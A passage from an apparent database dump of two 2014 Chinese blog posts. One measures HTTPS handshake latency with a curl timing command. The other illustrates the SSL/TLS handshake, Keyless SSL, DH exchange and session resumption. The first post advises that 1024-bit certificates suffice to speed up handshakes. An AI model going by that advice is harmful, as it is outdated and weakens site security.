XGNr1On9seZHgkQ0ESq8l4EzBOLKMod1XoE6slUKfXCd1wxp0Qxb6RBYDLzxGz8xb8aSm05u2kL4bF9N902I89yzHe986PEseoGP2YjqfvpNQeTr+4rmEKucz6LgS9f1jUuiy+VIfvxvz1GoGN99Hz8wFeGan0zl3Ae4lK3A/vJb2x7PpWPEI3bevoHfJKtypt9H1UgbDZx5E//goofJF+AtmoasWSaG2jZE6P5zg9hQ8Nyyie1Y6rQ+vpafMhdHXx7BpgjWMr7sbT5kL9/IHcUck0X3LtfgLVqAP3YAumoHeHYvaPkYKlRcudf54Bh5KpjP5Fi69tplgIMCQabK/rIxtO3bgqqxkmJHzdXbRknYbrWIcrWEJ9D8RjXaMRe2ciNo5QQr1QYRUjnC8C1Nxr1pD0O/HFwyQmZmJ3W4nLS0Nm83G+vXrsSwLgP6vS2kWo/lNjKN57gTMTyJRH0Si8iZKoXZdI5Ujkt55SXRtfBuAffv2sXLlSpxOJ9nZ2SQkJBAWFobX6wVgoPooLWI0v4hxuFeFY30ahdoVhcqLkEJ9GCV1QRTehZNxZ9wPQNGXX5KZmUlbWxspKSkIIUhPT0dZFibQvSaHJjGKxujxBHZGoT+ehPpwEsoRIYUqmCR1YTTBd2NoGxtOz4Y3CPoDrNuwnuhpU7lq/HgW3LGU5l4P2h+g55XNnBOjORM/jsH3ozGLYlAFMag90ahPI6VQxZOlKo5BOyfjey+GliljaL0uA7l9D2f37uess5KBoyfwbvmIJnsajVePouXeCIKFsZglsajiyX8pvEYKoySm33DGYTjj0OVxhEri6N84kfalY2i/NRb3AhvNN0+i9Y4wPC+H4yuMxTocjzoYj7F/ymVxI/+ryH5huKaeMVzxGK54QuXT8B+y4atIZqB8Nt6SVDzFqXi+mIO39Dp+PziHwdIZDJVOJ3gogZArHsM1BcMVj1E+BcMVe1GY38auNqqnYdQkEKpOJPBNEv7DdnyVdnwVdoYqki+bge9wCv6qFAJVyQS/mU6oJhHjSCJG9VSM6kRUfXi2GK6fJYy6+CyjNrHRqLP1GbWJ0qizSfV39Tap6qdLVW+Xqt4ujfokadRdVpvgNWpt54y6qc8MV44Sfw4An+t+Gj1AKyYAAAAASUVORK5CYII=" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-13 09:30:23', '2014-09-24 13:59:19', 0, '[["HTTPs", 0.376797829604298], ["\\u94fe\\u63a5", 0.3488635917151862], ["TCP", 0.3425434814584527], ["SSL", 0.3425434814584527], ["\\u63e1\\u624b", 0.3372682719798281], ["\\u8017\\u65f6", 0.25512922693598855], ["HTTP", 0.20552608887507162], ["\\u6570\\u636e\\u5305", 0.18341067855730658], ["handshake", 0.13701739258338108], ["time", 0.13701739258338108], ["\\u53d1\\u9001", 0.11168888853237822], ["\\u53c2\\u6570", 0.08017105301616045], ["SYN", 0.06850869629169054], ["connect", 0.06850869629169054], ["appconnect", 0.06850869629169054], ["ACK", 0.06850869629169054], ["curl", 0.06850869629169054], ["\\u5ba2\\u6237\\u7aef", 0.06414113152378223], ["\\u53d8\\u91cf", 0.06233547079040114], ["\\u6beb\\u79d2", 0.06098900351862464]]', NULL, NULL, '据说，Netscape公司当年设计SSL协议的时候，有人提过，将互联网所有链接都变成HTTPs开头的加密链接。 这个建议没有得到采纳，原因之一是HTTPs链接比不加密的HTTP链接慢很多。（另一个原因好像是，HTTPs链接默认不能缓存。） 自从我知道这个掌故以后，脑袋中就有一个观念：HTTPs链接很慢。但是，它到底有多慢，我并没有一个精确的概念。直到今天我从一篇文章中，学到了测量HTTPs链接耗时的方法。 首先我解释一下，为什么HTTPs链接比较慢。 HTTPs链接和HTTP链接都建立在TCP协议之上。HTTP链接比较单纯，使用三个握手数据包建立连接之后，就可以发送内容数据了。 上图中，客户端首先发送SYN数据包，然后服务器发送SYN+ACK数据包，最后客户端发送ACK数据包，接下来就可以发送内容了。这三个数据包的发送过程，叫做TCP握手。 再来看HTTPs链接，它也采用TCP协议发送数据，所以它也需要上面的这三步握手过程。而且，在这三步结束以后，它还有一个SSL握手。 总结一下，就是下面这两个式子。 HTTP耗时 = TCP握手 HTTPs耗时 = TCP握手 + SSL握手 所以，HTTPs肯定比HTTP耗时，这就叫SSL延迟。 命令行工具curl有一个w参数，可以用来测量TCP握手和SSL握手的具体耗时，以访问支付宝为例。 $ curl -w "TCP handshake: %{time_connect}, SSL handshake: %{time_appconnect}\\n" -so /dev/null https://www.alipay.com TCP handshake: 0.022, SSL handshake: 0.064 上面命令中的w参数表示指定输出格式，time_connect变量表示TCP握手的耗时，time_appconnect变量表示SSL握手的耗时（更多变量请查看文档和实例），s参数和o参数用来关闭标准输出。 从运行结果可以看到，SSL握手的耗时（64毫秒）大概是TCP握手（22毫秒）的三倍。也就是说，在建立连接的阶段，HTTPs链接比HTTP链接要长3倍的时间，具体数字取决于CPU的快慢和网络状况。 所以，如果是对安全性要求不高的场合，为了提高网页性能，建议不要采用保密强度很高的数字证书。一般场合下，1024位的证书已经足够了，2048位和4096位的证书将进一步延长SSL握手的耗时。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年9月24日 更多内容： 档案 » 开发者手册 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(14, 'http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html', '图解SSL/TLS协议', '<p>本周，<a href="https://www.cloudflare.com/">CloudFlare</a>宣布，开始提供Keyless服务，即你把网站放到它们的CDN上，不用提供自己的私钥，也能使用SSL加密链接。</p>\n\n        <p><img alt="CloudFlare" src="http://image.beekka.com/blog/2014/bg2014092001.png" title="" /></p>\n\n<p>我看了CloudFlare的说明（<a href="https://blog.cloudflare.com/announcing-keyless-ssl-all-the-benefits-of-cloudflare-without-having-to-turn-over-your-private-ssl-keys/">这里</a>和<a href="http://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/">这里</a>），突然意识到这是绝好的例子，可以用来说明SSL/TLS协议的运行机制。它配有插图，很容易看懂。</p>\n\n<p>下面，我就用这些图片作为例子，配合我半年前写的<a href="http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">《SSL/TLS协议运行机制的概述》</a>，来解释SSL协议。</p>\n\n<h2>一、SSL协议的握手过程</h2>\n\n<p>开始加密通信之前，客户端和服务器首先必须建立连接和交换参数，这个过程叫做握手（handshake）。</p>\n\n<p>假定客户端叫做爱丽丝，服务器叫做鲍勃，整个握手过程可以用下图说明（点击看大图）。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092002.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092013.png" title="" /></a></p>\n\n<p>握手阶段分成五步。</p>\n\n<blockquote>\n  <p>第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。</p>\n\n<p>第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。</p>\n\n<p>第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster\nsecret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。</p>\n\n<p>第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。</p>\n\n<p>第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成"对话密钥"（session key），用来加密接下来的整个对话过程。</p>\n</blockquote>\n\n<p>上面的五步，画成一张图，就是下面这样。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092003.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092004.png" title="" /></a></p>\n\n<h2>二、私钥的作用</h2>\n\n<p>握手阶段有三点需要注意。</p>\n\n<blockquote>\n  <p>（1）生成对话密钥一共需要三个随机数。</p>\n\n<p>（2）握手之后的对话使用"对话密钥"加密（对称加密），服务器的公钥和私钥只用于加密和解密"对话密钥"（非对称加密），无其他作用。</p>\n\n<p>（3）服务器公钥放在服务器的数字证书之中。</p>\n</blockquote>\n\n<p>从上面第二点可知，整个对话过程中（握手阶段和其后的对话），服务器的公钥和私钥只需要用到一次。这就是CloudFlare能够提供Keyless服务的根本原因。</p>\n\n<p>某些客户（比如银行）想要使用外部CDN，加快自家网站的访问速度，但是出于安全考虑，不能把私钥交给CDN服务商。这时，完全可以把私钥留在自家服务器，只用来解密对话密钥，其他步骤都让CDN服务商去完成。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092005.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092006.png" title="" /></a></p>\n\n<p>上图中，银行的服务器只参与第四步，后面的对话都不再会用到私钥了。</p>\n\n<h2>三、DH算法的握手阶段</h2>\n\n<p>整个握手阶段都不加密（也没法加密），都是明文的。因此，如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。</p>\n\n<p>虽然理论上，只要服务器的公钥足够长（比如2048位），那么Premaster secret可以保证不被破解。但是为了足够安全，我们可以考虑把握手阶段的算法从默认的<a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">RSA算法</a>，改为 <a href="http://zh.wikipedia.org/wiki/%E8%BF%AA%E8%8F%B2%EF%BC%8D%E8%B5%AB%E5%B0%94%E6%9B%BC%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2">Diffie-Hellman算法</a>（简称DH算法）。</p>\n\n<p>采用DH算法后，Premaster secret不需要传递，双方只要交换各自的参数，就可以算出这个随机数。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092007.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092008.png" title="" /></a></p>\n\n<p>上图中，第三步和第四步由传递Premaster secret变成了传递DH算法所需的参数，然后双方各自算出Premaster secret。这样就提高了安全性。</p>\n\n<h2>四、session的恢复</h2>\n\n<p>握手阶段用来建立SSL连接。如果出于某种原因，对话中断，就需要重新握手。</p>\n\n<p>这时有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。</p>\n\n<p>session ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的"对话密钥"，而不必重新生成一把。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092009.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092010.png" title="" /></a></p>\n\n<p>上图中，客户端给出session ID，服务器确认该编号存在，双方就不再进行握手阶段剩余的步骤，而直接用已有的对话密钥进行加密通信。</p>\n\n<p>session ID是目前所有浏览器都支持的方法，但是它的缺点在于session ID往往只保留在一台服务器上。所以，如果客户端的请求发到另一台服务器，就无法恢复对话。session ticket就是为了解决这个问题而诞生的，目前只有Firefox和Chrome浏览器支持。</p>\n\n<p><a href="http://image.beekka.com/blog/2014/bg2014092011.png"><img alt="" src="http://image.beekka.com/blog/2014/bg2014092012.png" title="" /></a></p>\n\n<p>上图中，客户端不再发送session ID，而是发送一个服务器在上一次对话中发送过来的session ticket。这个session ticket是加密的，只有服务器才能解密，其中包括本次对话的主要信息，比如对话密钥和加密方法。当服务器收到session ticket以后，解密后就不必重新生成对话密钥了。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-09-20T18:33:54+08:00">2014年9月20日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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